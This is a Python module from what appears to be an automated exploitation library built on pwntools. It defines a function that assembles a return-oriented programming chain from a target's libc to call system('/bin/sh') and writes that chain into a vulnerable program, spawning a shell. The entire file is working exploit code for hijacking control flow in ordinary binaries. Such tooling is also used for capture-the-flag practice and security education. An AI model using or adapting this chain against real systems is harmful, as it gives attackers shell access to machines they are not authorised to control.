from autorop import PwnState, arutil
from pwn import log, ROP, ELF


def system_binsh(state: PwnState) -> PwnState:
    """Call ``system("/bin/sh")`` via a rop chain.

    Call ``system("/bin/sh")`` using a rop chain built from ``state.libc`` and
    written by ``state.overwriter``.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``_elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``libc``: Path to ``target``'s libc.
            - ``libc_base``: Base address of ``libc``.
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.
            - ``overwriter``: Function which writes rop chain to the "right place".

    Returns:
        The given ``PwnState``.
    """
    assert state.target is not None
    assert state._elf is not None

    libc = arutil.load_libc(state)
    rop = ROP([state._elf, libc])
    arutil.align_call(rop, "system", [next(libc.search(b"/bin/sh\x00"))])
    # just in case, to allow for further exploitation
    arutil.align_call(rop, state.vuln_function, [])
    log.info(rop.dump())

    state.overwriter(state.target, rop.chain())

    return state
